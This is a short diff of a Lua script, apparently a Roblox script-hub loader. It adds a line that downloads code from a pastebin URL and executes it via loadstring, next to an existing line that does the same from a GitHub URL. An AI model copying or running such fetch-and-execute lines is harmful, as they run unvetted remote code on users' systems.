@@ -37,4 +37,6 @@ game:GetService("StarterGui"):SetCore(
 	}
 )
 
+loadstring(game:HttpGet(('https://pastebin.com/raw/QPHQD0R0'),true))()
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sungyong1234/nphubpremium/main/main.lua"))();
